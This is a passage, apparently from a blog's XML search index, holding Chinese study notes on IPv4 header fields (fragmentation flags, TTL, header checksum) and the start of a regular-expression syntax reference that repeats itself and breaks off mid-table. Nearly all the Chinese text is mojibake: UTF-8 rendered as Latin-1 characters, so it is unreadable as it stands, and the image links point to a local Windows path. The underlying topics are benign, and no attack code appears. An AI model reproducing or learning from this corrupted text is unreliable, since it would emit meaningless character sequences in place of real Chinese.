æ•°æ®æŠ¥è¶Šé•¿ä½¿ç”¨æ•ˆçŽ‡è¶Šé«˜ï¼Œä½†æ˜¯ä¸ºäº†è·¯ç”±è½¬å‘é€Ÿåº¦ï¼Œè§„å®šäº’è”ç½‘ä¸­æ‰€æœ‰ä¸»æœºå’Œè·¯ç”±å™¨ï¼Œèƒ½å¤ŸæŽ¥å—é•¿åº¦ä¸è¶…è¿‡576å­—èŠ‚çš„æ•°æ®æŠ¥ã€‚512å­—èŠ‚æ•°æ®+60å­—èŠ‚é¦–éƒ¨+4å­—èŠ‚å¯Œä½™é‡ã€‚ æ ‡è¯†ï¼šå 16ä½ã€‚IPè½¯ä»¶åœ¨å­˜å‚¨å™¨ä¸­ç»´æŒä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯äº§ç”Ÿä¸€ä¸ªæ•°æ®æŠ¥å°±åŠ ä¸€ï¼Œå¹¶å°†æ­¤å€¼èµ‹ç»™æ ‡è¯†å­—æ®µï¼ˆç”±äºŽIPæ˜¯æ— è¿žæŽ¥æœåŠ¡ï¼Œæ•…è¯¥å­—æ®µå¹¶ä¸èƒ½çœ‹æˆåºå·ï¼‰ã€‚å½“æ•°æ®æŠ¥ç”±äºŽè¶…è¿‡MTUè€Œè¿›è¡Œåˆ†ç‰‡ï¼Œè¯¥å­—æ®µä½œä¸ºé‡è£…çš„ä¾æ®ã€‚ æ ‡å¿—ï¼šå 3ä½ï¼Œåªæœ‰å‰ä¸¤ä½æœ‰æ„ä¹‰ã€‚è¯¥å­—æ®µæœ€ä½Žä½è®°ä¸ºMF(More Fragment)ã€‚MF=1è¡¨ç¤ºåŽé¢è¿˜æœ‰åˆ†ç‰‡çš„æ•°æ®æŠ¥ï¼ŒMF=0è¡¨ç¤ºå·²æ˜¯æœ€åŽä¸€ä¸ªæ•°æ®æŠ¥ã€‚ä¸­é—´ä¸€ä½è®°ä¸ºDF(Donâ€™t Fragmentï¼‰æ„ä¸ºä¸èƒ½åˆ†ç‰‡ã€‚DF=0æ—¶å…è®¸åˆ†ç‰‡ã€‚ ç‰‡åç§»ï¼šå 13ä½ã€‚åˆ†ç‰‡åŽæŸç‰‡åœ¨åŽŸåˆ†ç»„ä¸­çš„ç›¸å¯¹ä½ç½®ï¼Œä»¥8ä¸ªå­—èŠ‚ä¸ºå•ä½ï¼Œæ‰€ä»¥æ¯ä¸ªåˆ†ç‰‡çš„é•¿åº¦ä¸€å®šæ˜¯8å­—èŠ‚çš„æ•´æ•°å€ã€‚ï¼ˆä¹Ÿä¸æ‡‚ä¸ºå•¥è¦ç”¨æ¯ä¸€ç‰‡é¦–åœ°å€é™¤ä»¥8ï¼Œå¯èƒ½æ˜¯ç¼©å°é•¿åº¦å§ï¼‰ ç”Ÿå­˜æ—¶é—´ï¼šå 8ä½ï¼ŒTTL(Time To Live)ï¼Œè¡¨æ˜Žæ•°æ®æŠ¥åœ¨ç½‘ç»œä¸­çš„å¯¿å‘½ã€‚ç”±å‘å‡ºæ•°æ®æŠ¥çš„æºç‚¹è®¾ç½®è¿™ä¸ªå­—æ®µï¼Œé˜²æ­¢æ— æ³•äº¤ä»˜çš„æ•°æ®æŠ¥æ— é™åˆ¶åœ°åœ¨äº’è”ç½‘ä¸­æ¸¸è¡ã€‚TTLçš„åŠŸèƒ½ä»Žå€’è®¡æ—¶å˜ä¸ºäº†è·³æ•°é™åˆ¶ï¼Œè·¯ç”±å™¨æ¯æ¬¡è½¬å‘å‰å°†TTLå‡ä¸€ã€‚åˆå§‹å€¼è®¾ä¸ºä¸€ï¼Œå°±è¡¨ç¤ºè¿™ä¸ªæ•°æ®æŠ¥åªèƒ½åœ¨æœ¬å±€åŸŸç½‘ä¸­ä¼ é€ã€‚TTLçš„æ„ä¹‰æ˜¯æŒ‡æ˜Žæ•°æ®æŠ¥åœ¨äº’è”ç½‘ä¸­å¯ä»¥ç»è¿‡å¤šå°‘ä¸ªè·¯ç”±å™¨ï¼Œæ˜¾ç„¶æ•°æ®æŠ¥èƒ½åœ¨äº’è”ç½‘ç»è¿‡çš„è·¯ç”±å™¨æœ€å¤§æ•°å€¼æ˜¯255ï¼Ÿ åè®®ï¼šå 8ä½ï¼Œåè®®å­—æ®µä¹‹å¤„æ­¤æ•°æ®æºå¸¦çš„æ•°æ®æ˜¯ä½•ç§åè®®ï¼Œä»¥ä½¿ç›®çš„ä¸»æœºçš„IPå±‚çŸ¥é“åº”å°†æ•°æ®éƒ¨åˆ†ä¸Šäº¤ç»™å“ªä¸ªåè®®è¿›è¡Œå¤„ç†ã€‚ ![QQå›¾ç‰‡20200429160622](D:\My Daily\P\QQå›¾ç‰‡20200429160622.png) é¦–éƒ¨æ ¡éªŒå’Œï¼šå 16ä½ï¼Œåªæ£€æŸ¥æ•°æ®æŠ¥çš„é¦–éƒ¨ï¼Œä¸åŒ…æ‹¬æ•°æ®éƒ¨åˆ†ã€‚è¿™æ˜¯å› ä¸ºæ•°æ®æŠ¥æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œè·¯ç”±å™¨éƒ½è¦é‡æ–°è®¡ç®—ä¸€ä¸‹é¦–éƒ¨æ ¡éªŒå’Œï¼ˆå¦‚ç”Ÿå­˜æ—¶é—´/æ ‡å¿—/ç‰‡åç§»å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼‰ã€‚ä¸ºäº†è¿›ä¸€æ­¥å‡å°‘è®¡ç®—å·¥ä½œé‡ï¼ŒIPçš„é¦–éƒ¨æ ¡éªŒå’Œä¸é‡‡ç”¨CRCæ£€éªŒç è€Œå¦‚ä¸‹è®¡ç®—ï¼š ![QQå›¾ç‰‡20200429162919](D:\My Daily\P\QQå›¾ç‰‡20200429162919.png) æºåœ°å€ï¼šå 32ä½ã€‚ ç›®çš„åœ°å€ï¼šå 32ä½ã€‚ IPæ•°æ®æŠ¥çš„å¯å˜éƒ¨åˆ†ï¼Œé€‰é¡¹å­—æ®µï¼Œç”¨äºŽæ”¯æŒæŽ’é”™ã€‚æµ‹é‡ä»¥åŠå®‰å…¨çš„æŽªæ–½ã€‚ IPå±‚è½¬å‘åˆ†ç»„çš„æµç¨‹]]></content>
      <tags>
        <tag>è®¡ç®—æœºç½‘ç»œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2F2020%2F04%2F01%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[æ­£åˆ™è¡¨è¾¾å¼(Regular Expression)æ˜¯ä¸€ç§æ–‡æœ¬æ¨¡å¼ï¼ŒåŒ…æ‹¬æ™®é€šå­—ç¬¦å’Œç‰¹æ®Šå­—ç¬¦(ç§°ä¸ºå…ƒå­—ç¬¦)ã€‚æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨å•ä¸ªå­—ç¬¦ä¸²æ¥æè¿°ï¼ŒåŒ¹é…ä¸€ç³»åˆ—ç¬¦åˆæŸä¸ªå¥æ³•è§„åˆ™çš„å­—ç¬¦ä¸²ã€‚è®¸å¤šç¨‹åºè®¾è®¡åŽŸå› å‘¢éƒ½æ”¯æŒåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œå­—ç¬¦ä¸²æ“ä½œã€‚ çŸ¥è¯†ç‚¹å¤ªç»†ç¢Žè¿˜æ˜¯è¦å¤šç”¨æ‰èƒ½è®°ä½ã€‚ ç®€ä»‹æ­£åˆ™è¡¨è¾¾å¼çš„å·¥ä½œåŽŸç†ä¸Ž*å’Œ.é€šé…ç¬¦ç±»ä¼¼ï¼Œä½†å‰è€…åŠŸèƒ½æ›´å¼ºå¤§æ›´çµæ´»ã€‚ å…¸åž‹çš„æœç´¢ä¸Žæ›¿æ¢æ“ä½œï¼Œè¦æ±‚æä¾›ä¸Žé¢„æœŸçš„çš„æœç´¢ç»“æžœåŒ¹é…çš„ç¡®åˆ‡æ–‡æœ¬ã€‚è¿™ç§æŠ€æœ¯åœ¨åº”å¯¹åŠ¨æ€æ–‡æœ¬çš„æœç´¢æ—¶å¾ˆå›°éš¾ã€‚é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥ æµ‹è¯•å­—ç¬¦ä¸²å†…çš„æ¨¡å¼ï¼Œå¦‚æµ‹è¯•è¾“å…¥å­—ç¬¦ä¸²æŸ¥çœ‹å­—ç¬¦ä¸²å†…æ˜¯å¦å‡ºçŽ°ç”µè¯å·ç /èº«ä»½è¯å·ï¼Œç§°ä¸ºæ•°æ®éªŒè¯ã€‚ æ›¿æ¢æ–‡æœ¬ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¯†åˆ«æ–‡æ¡£ä¸­çš„ç‰¹å®šæ–‡æœ¬ï¼Œå®Œå…¨åˆ é™¤è¯¥æ–‡æœ¬æˆ–è€…ç”¨å…¶ä»–æ–‡æœ¬æ›¿æ¢ã€‚ åŸºäºŽæ¨¡å¼åŒ¹é…ä»Žå­—ç¬¦ä¸²ä¸­æå–å­å­—ç¬¦ä¸²ï¼ŒæŸ¥æ‰¾æ–‡æ¡£å†…/è¾“å…¥åŸŸå†…ç‰¹å®šçš„ä¸ªæ–‡æœ¬ã€‚ è¯­æ³•æ­£åˆ™è¡¨è¾¾å¼æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼Œç”¨æ¥æ£€æ“¦ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ï¼Œå°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»ŽæŸä¸ªä¸²ä¸­å–å‡ºæŸä¸ªç¬¦åˆæ¡ä»¶çš„å­ä¸²ã€‚ æž„å»ºæ­£åˆ™è¡¨è¾¾å¼çš„æ–¹æ³•åŸŸåˆ›å»ºæ•°å­¦è¡¨è¾¾å¼ä¸€æ ·ï¼Œç”¨å¤šç§å…ƒå­—ç¬¦åŸŸè¿ç®—ç¬¦å¯ä»¥å°†å°çš„è¡¨è¾¾å¼ç»“åˆåœ¨ä¸€èµ·åˆ›å»ºæ›´å¤§çš„è¡¨è¾¾å¼ã€‚æ­£åˆ™è¡¨è¾¾å¼æ˜¯ç”±æ™®é€šå­—ç¬¦ä»¥åŠç‰¹æ®Šå­—ç¬¦ç»„æˆçš„æ–‡å­—æ¨¡å¼ï¼Œæ¨¡å¼æè¿°åœ¨æœç´¢æ–‡æœ¬æ—¶è¦åŒ¹é…çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ã€‚æ­£åˆ™è¡¨è¾¾å¼ä½œä¸ºä¸€ä¸ªæ¨¡æ¿ï¼Œå°†æŸä¸ªå­—ç¬¦æ¨¡å¼åŸŸæ‰€æœç´¢çš„å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ã€‚ æ™®é€šå­—ç¬¦åŒ…æ‹¬æ²¡æœ‰æ˜¾å¼æŒ‡å®šä¸ºå…ƒå­—ç¬¦çš„æ‰€æœ‰å¯æ‰“å°å’Œä¸å¯æ‰“å°å­—ç¬¦ã€‚è¿™åŒ…æ‹¬æ‰€æœ‰å¤§å†™å’Œå°å†™å­—æ¯ã€æ‰€æœ‰æ•°å­—ã€æ‰€æœ‰æ ‡ç‚¹ç¬¦å·å’Œä¸€äº›å…¶ä»–ç¬¦å·ã€‚ éžæ‰“å°å­—ç¬¦ä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆéƒ¨åˆ†ã€‚ä¸‹è¡¨åˆ—å‡ºäº†è¡¨ç¤ºéžæ‰“å°å­—ç¬¦çš„è½¬ä¹‰åºåˆ—ï¼š \cx åŒ¹é…ç”±xæŒ‡æ˜Žçš„æŽ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \cM åŒ¹é…ä¸€ä¸ª Control-M æˆ–å›žè½¦ç¬¦ã€‚x çš„å€¼å¿…é¡»ä¸º A-Z æˆ– a-z ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°† c è§†ä¸ºä¸€ä¸ªåŽŸä¹‰çš„ â€˜câ€™ å­—ç¬¦ã€‚ \f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äºŽ \x0c å’Œ \cLã€‚ \n åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äºŽ \x0a å’Œ \cJã€‚ \r åŒ¹é…ä¸€ä¸ªå›žè½¦ç¬¦ã€‚ç­‰ä»·äºŽ \x0d å’Œ \cMã€‚ \s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äºŽ [ \f\n\r\t\v]ã€‚æ³¨æ„ Unicode æ­£åˆ™è¡¨è¾¾å¼ä¼šåŒ¹é…å…¨è§’ç©ºæ ¼ç¬¦ã€‚ \S åŒ¹é…ä»»ä½•éžç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äºŽ [^ \f\n\r\t\v]ã€‚ \t åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äºŽ \x09 å’Œ \cIã€‚ \v åŒ¹é…ä¸€ä¸ªåž‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äºŽ \x0b å’Œ \cKã€‚ ç‰¹æ®Šå­—ç¬¦ï¼šè®¸å¤šå…ƒå­—ç¬¦è¦æ±‚åœ¨è¯•å›¾åŒ¹é…å®ƒä»¬æ—¶ç‰¹åˆ«å¯¹å¾…ã€‚è‹¥è¦åŒ¹é…è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¿…é¡»é¦–å…ˆä½¿å­—ç¬¦â€è½¬ä¹‰â€ï¼Œå³ï¼Œå°†åæ–œæ å­—ç¬¦\ æ”¾åœ¨å®ƒä»¬å‰é¢ã€‚ $ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®ã€‚å¦‚æžœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±žæ€§ï¼Œåˆ™ $ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ã€‚è¦åŒ¹é… $ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ $ã€‚ ( ) æ ‡è®°ä¸€ä¸ªå­è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®ã€‚å­è¡¨è¾¾å¼å¯ä»¥èŽ·å–ä¾›ä»¥åŽä½¿ç”¨ã€‚è¦åŒ¹é…è¿™äº›å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ( å’Œ )ã€‚ * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… * å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ *ã€‚ + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… + å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ +ã€‚ . åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚è¦åŒ¹é… . ï¼Œè¯·ä½¿ç”¨ . ã€‚ [ æ ‡è®°ä¸€ä¸ªä¸­æ‹¬å·è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… [ï¼Œè¯·ä½¿ç”¨ [ã€‚ ? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜Žä¸€ä¸ªéžè´ªå©ªé™å®šç¬¦ã€‚è¦åŒ¹é… ? å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ?ã€‚ \ å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºæˆ–ç‰¹æ®Šå­—ç¬¦ã€æˆ–åŽŸä¹‰å­—ç¬¦ã€æˆ–å‘åŽå¼•ç”¨ã€æˆ–å…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜nâ€™ åŒ¹é…å­—ç¬¦ â€˜nâ€™ã€‚â€™\nâ€™ åŒ¹é…æ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\â€˜ åŒ¹é… â€œ&quot;ï¼Œè€Œ â€˜(â€˜ åˆ™åŒ¹é… â€œ(â€œã€‚ ^ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œé™¤éžåœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨ï¼Œå½“è¯¥ç¬¦å·åœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºä¸æŽ¥å—è¯¥æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦é›†åˆã€‚è¦åŒ¹é… ^ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ ^ã€‚ { æ ‡è®°é™å®šç¬¦è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… {ï¼Œè¯·ä½¿ç”¨ {ã€‚ | æŒ‡æ˜Žä¸¤é¡¹ä¹‹é—´çš„ä¸€ä¸ªé€‰æ‹©ã€‚è¦åŒ¹é… |ï¼Œè¯·ä½¿ç”¨ |ã€‚ é™å®šç¬¦ï¼šç”¨æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç»™å®šç»„ä»¶å¿…é¡»è¦å‡ºçŽ°å¤šå°‘æ¬¡æ‰èƒ½æ»¡è¶³åŒ¹é…ã€‚æœ‰ *** æˆ– **+ æˆ– ? æˆ– {n} æˆ– {n,}æˆ– {n,m} å…±6ç§ã€‚ * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äºŽ{0,}ã€‚ + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äºŽ {1,}ã€‚ ? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ ã€ â€œdoesâ€ ä¸­çš„ â€œdoesâ€ ã€ â€œdoxyâ€ ä¸­çš„ â€œdoâ€ ã€‚? ç­‰ä»·äºŽ {0,1}ã€‚ {n} n æ˜¯ä¸€ä¸ªéžè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚ {n,} n æ˜¯ä¸€ä¸ªéžè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äºŽ â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äºŽ â€˜o*â€™ã€‚ {n,m} m å’Œ n å‡ä¸ºéžè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äºŽ â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚ *\ã€+** é™å®šç¬¦éƒ½æ˜¯è´ªå©ªçš„ï¼Œå› ä¸ºå®ƒä»¬ä¼šå°½å¯èƒ½å¤šçš„åŒ¹é…æ–‡å­—ï¼Œåªæœ‰åœ¨å®ƒä»¬çš„åŽé¢åŠ ä¸Šä¸€ä¸ª?å°±å¯ä»¥å®žçŽ°éžè´ªå©ªæˆ–æœ€å°åŒ¹é…ã€‚** å®šä½ç¬¦ï¼šèƒ½å¤Ÿå°†æ­£åˆ™è¡¨è¾¾å¼å›ºå®šåˆ°è¡Œé¦–æˆ–è¡Œå°¾ã€‚å®ƒä»¬è¿˜ä½¿æ‚¨èƒ½å¤Ÿåˆ›å»ºè¿™æ ·çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™äº›æ­£åˆ™è¡¨è¾¾å¼å‡ºçŽ°åœ¨ä¸€ä¸ªå•è¯å†…ã€åœ¨ä¸€ä¸ªå•è¯çš„å¼€å¤´æˆ–è€…ä¸€ä¸ªå•è¯çš„ç»“å°¾ã€‚ å®šä½ç¬¦ç”¨æ¥æè¿°å­—ç¬¦ä¸²æˆ–å•è¯çš„è¾¹ç•Œï¼Œ^ å’Œ $ åˆ†åˆ«æŒ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä¸Žç»“æŸï¼Œ\b æè¿°å•è¯çš„å‰æˆ–åŽè¾¹ç•Œï¼Œ\B è¡¨ç¤ºéžå•è¯è¾¹ç•Œã€‚ ^ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²å¼€å§‹çš„ä½ç½®ã€‚å¦‚æžœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±žæ€§ï¼Œ^ è¿˜ä¼šä¸Ž \n æˆ– \r ä¹‹åŽçš„ä½ç½®åŒ¹é…ã€‚ $ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²ç»“å°¾çš„ä½ç½®ã€‚å¦‚æžœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±žæ€§ï¼Œ$ è¿˜ä¼šä¸Ž \n æˆ– \r ä¹‹å‰çš„ä½ç½®åŒ¹é…ã€‚ \b åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œå³å­—ä¸Žç©ºæ ¼é—´çš„ä½ç½®ã€‚ \B éžå•è¯è¾¹ç•ŒåŒ¹é…ã€‚ ä¸èƒ½å°†é™å®šç¬¦ä¸Žå®šä½ç¬¦ä¸€èµ·ä½¿ç”¨ã€‚ç”±äºŽåœ¨ç´§é æ¢è¡Œæˆ–è€…å•è¯è¾¹ç•Œçš„å‰é¢æˆ–åŽé¢ä¸èƒ½æœ‰ä¸€ä¸ªä»¥ä¸Šä½ç½®ï¼Œå› æ­¤ä¸å…è®¸è¯¸å¦‚ ^* ä¹‹ç±»çš„è¡¨è¾¾å¼ã€‚ è‹¥è¦åŒ¹é…ä¸€è¡Œæ–‡æœ¬å¼€å§‹å¤„çš„æ–‡æœ¬ï¼Œè¯·åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹ä½¿ç”¨ ^ å­—ç¬¦ã€‚ä¸è¦å°† ^ çš„è¿™ç§ç”¨æ³•ä¸Žä¸­æ‹¬å·è¡¨è¾¾å¼å†…çš„ç”¨æ³•æ··æ·†ã€‚ è‹¥è¦åŒ¹é…ä¸€è¡Œæ–‡æœ¬çš„ç»“æŸå¤„çš„æ–‡æœ¬ï¼Œè¯·åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„ç»“æŸå¤„ä½¿ç”¨ $ å­—ç¬¦ã€‚ é€‰æ‹©ï¼š ç”¨åœ†æ‹¬å·å°†æ‰€æœ‰é€‰æ‹©é¡¹æ‹¬èµ·æ¥ï¼Œç›¸é‚»çš„é€‰æ‹©é¡¹ä¹‹é—´ç”¨|åˆ†éš”ã€‚ä½†ç”¨åœ†æ‹¬å·ä¼šæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œä½¿ç›¸å…³çš„åŒ¹é…ä¼šè¢«ç¼“å­˜ï¼Œæ­¤æ—¶å¯ç”¨?:æ”¾åœ¨ç¬¬ä¸€ä¸ªé€‰é¡¹å‰æ¥æ¶ˆé™¤è¿™ç§å‰¯ä½œç”¨ã€‚ å…¶ä¸­ ?: æ˜¯éžæ•èŽ·å…ƒä¹‹ä¸€ï¼Œè¿˜æœ‰ä¸¤ä¸ªéžæ•èŽ·å…ƒæ˜¯ ?= å’Œ ?!ï¼Œè¿™ä¸¤ä¸ªè¿˜æœ‰æ›´å¤šçš„å«ä¹‰ï¼Œå‰è€…ä¸ºæ­£å‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹åŒ¹é…åœ†æ‹¬å·å†…çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ï¼ŒåŽè€…ä¸ºè´Ÿå‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹ä¸åŒ¹é…è¯¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ã€‚ å…ƒå­—ç¬¦ \ å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŽŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ª å‘åŽå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™nâ€™ åŒ¹é…å­—ç¬¦ â€œnâ€ã€‚â€™\nâ€™ åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\â€˜ åŒ¹é… â€œ&quot; è€Œ â€œ(â€œ åˆ™åŒ¹é… â€œ(â€œã€‚ ^ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æžœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±žæ€§ï¼Œ^ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ ä¹‹åŽçš„ä½ç½®ã€‚ $ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æžœè®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±žæ€§ï¼Œ$ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ ä¹‹å‰çš„ä½ç½®ã€‚ * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äºŽ{0,}ã€‚ + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äºŽ {1,}ã€‚ ? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ æˆ– â€œdoesâ€ ã€‚? ç­‰ä»·äºŽ {0,1}ã€‚ {n} n æ˜¯ä¸€ä¸ªéžè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚ {n,} n æ˜¯ä¸€ä¸ªéžè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äºŽ â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äºŽ â€˜o*â€™ã€‚ {n,m} m å’Œ n 